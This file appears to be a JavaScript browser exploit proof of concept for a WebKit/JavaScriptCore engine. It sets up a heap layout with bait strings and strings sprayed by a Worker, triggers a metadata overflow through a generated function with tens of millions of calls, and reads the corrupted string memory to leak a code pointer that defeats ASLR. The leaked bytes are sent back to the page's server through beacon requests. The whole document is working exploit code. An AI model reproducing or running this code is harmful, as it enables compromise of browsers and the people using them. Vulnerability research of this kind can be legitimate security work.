// p146 — Primary heap string targets
// FIXED: ArrayBuffer targets were in SEPARATE Auxiliary heap (bmalloc.h:58-61).
//        MetadataTable is in Primary heap (FastMalloc).
//        StringImpl is ALSO in Primary heap (DebugHeap.h:91-92).
//        Worker's StringImpl shares the SAME process-wide Primary heap.
//
// STRATEGY:
// 1. Main thread allocates bait strings (~100KB each, Primary heap)
// 2. Worker allocates target strings (~100KB each, Primary heap, higher addresses)
// 3. Main thread frees baits, GC pressure
// 4. Overflow metadata fills freed bait slot (first-fit reuse)
// 5. Sweep writes forward → hits Worker's target strings
// 6. Worker polls charCodeAt + .length → detects corruption, reads leaked pointer
//
// Entry offset cycle (stride=112, slot=102400, GCD=16):
//   Slot 1: offset 80  (header safe, data corrupted at charCodeAt ≥56)
//   Slot 2: offset 48  (header safe, data corrupted at charCodeAt ≥24)
//   Slot 3: offset 16  (flags corrupted, data pointer safe)
//   Slot 4: offset 96  (header safe)
//   Slot 5: offset 64  (header safe)
//   Slot 6: offset 32  (header safe)
//   Slot 7: offset 0   (HEADER OVERWRITTEN — m_length readable via .length)
//
// m_slowPathCallDestination at entry_offset+24 = LLInt code pointer (ASLR leak)
//
// Beacon prefix: V146S-

(function() {
  var B = function(tag) {
    try {
      var x = new XMLHttpRequest();
      x.open('GET', '/beacon/V146S-' + tag + '?t=' + Date.now(), true);
      x.send();
    } catch(e) {}
  };

  B('BOOT');

  // ── WORKER ──
  // Worker allocates its OWN strings in Primary heap (same bmalloc heap).
  // No transfer needed — Worker strings are in same VA space.
  var workerCode = function() {
    var targets = [];
    var baseUrl = '';
    var STR_LEN = 100000;
    var CANARY = 0x41; // 'A'

    function beacon(tag) {
      try {
        var x = new XMLHttpRequest();
        x.open('GET', baseUrl + '/beacon/V146S-W-' + tag + '?t=' + Date.now(), false);
        x.send();
      } catch(e) {}
    }

    self.onmessage = function(e) {
      if (e.data.cmd === 'init') {
        baseUrl = e.data.baseUrl;
        beacon('ALIVE');
        return;
      }
      if (e.data.cmd === 'alloc') {
        var count = e.data.count;
        for (var i = 0; i < count; i++) {
          var s = '';
          for (var j = 0; j < STR_LEN; j += 1000) {
            s += 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA';
          }
          s = s.substring(0, STR_LEN);
          s.charCodeAt(0); // force materialization
          targets.push(s);
        }
        beacon('TARGETS-' + targets.length);
        self.postMessage({ ready: true });
        return;
      }
      if (e.data.cmd === 'watch') {
        beacon('WATCHING');

        var found = false;
        var iterations = 0;

        while (!found) {
          for (var i = 0; i < targets.length; i++) {
            var len = targets[i].length;
            if (len !== STR_LEN) {
              beacon('LEN-' + i + '-' + len);
              found = true;
              break;
            }
            var c8 = targets[i].charCodeAt(8);
            var c24 = targets[i].charCodeAt(24);
            var c56 = targets[i].charCodeAt(56);
            if (c8 !== CANARY || c24 !== CANARY || c56 !== CANARY) {
              found = true;
              break;
            }
          }
          iterations++;
          if (iterations % 500000 === 0) {
            beacon('POLL-' + iterations);
          }
        }

        // Found corruption — now scan ALL strings and extract data
        for (var i = 0; i < targets.length; i++) {
          var len = targets[i].length;
          if (len !== STR_LEN) {
            beacon('H-' + i + '-len=' + len);
            continue; // header corrupt, skip charCodeAt
          }
          // Header intact — check for data corruption
          var c8 = targets[i].charCodeAt(8);
          if (c8 === CANARY) {
            var c24 = targets[i].charCodeAt(24);
            var c56 = targets[i].charCodeAt(56);
            if (c24 === CANARY && c56 === CANARY) continue; // clean
          }
          // This string has data corruption with intact header — READ IT
          // Find first corrupted byte
          var start = -1;
          for (var s = 0; s < 100; s++) {
            if (targets[i].charCodeAt(s) !== CANARY) { start = s; break; }
          }
          if (start < 0) continue;
          beacon('D-' + i + '-off=' + start);

          // Read 112 bytes from entry start (the full metadata entry)
          var hex = '';
          for (var b = start; b < start + 112 && b < STR_LEN; b++) {
            var v = targets[i].charCodeAt(b);
            hex += (v < 16 ? '0' : '') + v.toString(16);
          }
          // Beacon in chunks (URL length limit)
          beacon('E1-' + i + '-' + hex.substring(0, 160));
          if (hex.length > 160) beacon('E2-' + i + '-' + hex.substring(160));

          // m_slowPathCallDestination at entry+24 (8 bytes = LLInt code ptr)
          var ptrOff = start + 24;
          if (ptrOff + 8 <= STR_LEN) {
            var ptr = '';
            for (var p = ptrOff; p < ptrOff + 8; p++) {
              ptr += (targets[i].charCodeAt(p) < 16 ? '0' : '') + targets[i].charCodeAt(p).toString(16);
            }
            beacon('PTR-' + i + '-' + ptr);
          }

          // m_bytecodeIndex at entry+68 (4 bytes)
          var idxOff = start + 68;
          if (idxOff + 4 <= STR_LEN) {
            var idx = '';
            for (var d = idxOff; d < idxOff + 4; d++) {
              idx += (targets[i].charCodeAt(d) < 16 ? '0' : '') + targets[i].charCodeAt(d).toString(16);
            }
            beacon('IDX-' + i + '-' + idx);
          }
        }
        beacon('DONE');
      }
    };
  };

  var workerBlob = new Blob(
    ['(' + workerCode.toString() + ')()'],
    { type: 'application/javascript' }
  );
  var workerUrl = URL.createObjectURL(workerBlob);
  var worker = new Worker(workerUrl);
  var baseUrl = location.protocol + '//' + location.host;
  worker.postMessage({ cmd: 'init', baseUrl: baseUrl });

  // ── PHASE 1: BAIT STRINGS (Primary heap) ──
  // Same marge slot size as metadata buffer (102,400 bytes).
  // 100,000 chars → ~100,024 byte StringImpl → 102,400 byte slot.
  var N_BAIT = 20;
  var STR_LEN = 100000;

  B('BAIT-START');
  var baits = [];
  for (var i = 0; i < N_BAIT; i++) {
    var bait = '';
    for (var j = 0; j < STR_LEN; j += 1000) {
      bait += 'BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB';
    }
    bait = bait.substring(0, STR_LEN);
    bait.charCodeAt(0); // force StringImpl materialization
    baits.push(bait);
  }
  B('BAIT-DONE-' + N_BAIT);

  // ── PHASE 2: WORKER ALLOCATES TARGETS ──
  // Worker's StringImpl goes to same Primary heap, AFTER baits (higher address).
  worker.onmessage = function(e) {
    if (e.data.ready) {
      phaseFreeBaits();
    }
  };

  B('WORKER-ALLOC');
  worker.postMessage({ cmd: 'alloc', count: 14 });

  // ── PHASE 3: FREE BAITS + GC PRESSURE ──
  function phaseFreeBaits() {
    B('FREE-START');

    // Null all bait references
    for (var i = 0; i < baits.length; i++) {
      baits[i] = null;
    }
    baits = null;

    // GC pressure — no FinalizationRegistry (failed in p144)
    // Just do heavy allocation pressure + yield with setTimeout
    var gcRound = 0;

    function gcPressureRound() {
      // Allocate ephemeral objects to fill eden → trigger eden GC
      for (var j = 0; j < 1000; j++) {
        new ArrayBuffer(8192);
      }
      for (var j = 0; j < 500; j++) {
        new Array(100).fill(gcRound);
      }
      gcRound++;

      if (gcRound < 30) {
        setTimeout(gcPressureRound, 30);
      } else {
        B('GC-PRESSURE-' + gcRound);
        phaseBuildOverflow();
      }
    }

    gcPressureRound();
  }

  // ── PHASE 4: BUILD OVERFLOW ──
  function phaseBuildOverflow() {
    B('BUILD-START');

    var N_OVERFLOW = 38348816;
    var CHUNK = 4000000;
    var CHUNKS = Math.floor(N_OVERFLOW / CHUNK);
    var REM = N_OVERFLOW - CHUNKS * CHUNK;

    var callChunk = '';
    for (var c = 0; c < CHUNK; c++) callChunk += 'a();';
    var remChunk = '';
    for (var r = 0; r < REM; r++) remChunk += 'a();';

    var parts = ['window.__v146fn=function(a){'];
    for (var ch = 0; ch < CHUNKS; ch++) parts.push(callChunk);
    parts.push(remChunk);
    parts.push('};window.__v146ok=true;');

    var blob = new Blob(parts, { type: 'application/javascript' });
    B('BLOB-' + (blob.size / 1024 / 1024).toFixed(0) + 'MB');
    callChunk = null;
    remChunk = null;
    parts = null;

    var url = URL.createObjectURL(blob);
    var sc = document.createElement('script');

    sc.onload = function() {
      B('COMPILED-' + (window.__v146ok ? 'OK' : 'FAIL'));
      if (!window.__v146fn) { B('NO-FN'); return; }

      // ── PHASE 5: START WORKER POLLING, THEN TRIGGER ──
      worker.postMessage({ cmd: 'watch' });

      setTimeout(function() {
        B('CALLING');

        try {
          window.__v146fn(function(){});
        } catch(ex) {
          B('CATCH-' + (ex.message || '').substring(0, 30));
        }

        B('SURVIVED');
      }, 200);
    };

    sc.onerror = function() { B('SCRIPT-ERR'); };
    document.head.appendChild(sc);
    sc.src = url;
  }
})();
